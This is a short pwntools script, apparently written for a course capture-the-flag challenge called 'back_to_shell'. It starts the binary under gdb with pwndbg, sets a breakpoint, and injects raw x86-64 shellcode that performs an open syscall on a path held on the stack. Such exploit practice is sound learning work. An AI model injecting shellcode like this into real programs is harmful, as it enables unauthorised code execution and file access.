from pwn import *
import os
import shutil

TARGET = "/home/k/ODC/c1/back_to_shell"

# find system gdb
GDB_BIN = shutil.which("gdb") or "/usr/bin/gdb"

# derive pwndbg directory from the pwndbg wrapper location if possible
PWNDBG_WRAPPER = shutil.which("pwndbg")  # /usr/local/bin/pwndbg (your case)
pwndbg_init_candidates = []

if PWNDBG_WRAPPER:
    # second parent dir logic mirrored from wrapper: dir="$(dirname "$(dirname "$(realpath "$0")")")"
    real = os.path.realpath(PWNDBG_WRAPPER)
    parent = os.path.dirname(real)
    pparent = os.path.dirname(parent)
    # common places relative to that dir (match what wrapper uses)
    pwndbg_init_candidates += [
        os.path.join(pparent, "exe", "gdbinit.py"),
        os.path.join(pparent, "gdbinit.py"),
        os.path.join(pparent, "share", "pwndbg", "gdbinit.py"),
    ]

# fallback usual locations
pwndbg_init_candidates += [
    os.path.expanduser("~/.pwndbg/gdbinit.py"),
    os.path.expanduser("~/.gdbinit"),   # maybe it already sources pwndbg
    "/usr/share/pwndbg/gdbinit.py",
    "/usr/local/lib/pwndbg-gdb/exe/gdbinit.py",
]

pwndbg_init = next((p for p in pwndbg_init_candidates if os.path.exists(p)), None)

COMMANDS = "b *0x40116e\n"

if pwndbg_init:
    gdbscript = f"source {pwndbg_init}\nset pagination off\nset breakpoint pending on\n{COMMANDS}"
else:
    # no pwndbg init found - still use system gdb
    gdbscript = "set pagination off\nset breakpoint pending on\n" + COMMANDS

p = gdb.debug([TARGET], gdbscript=gdbscript, executable=GDB_BIN)
p.send(b"\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05")
p.interactive()
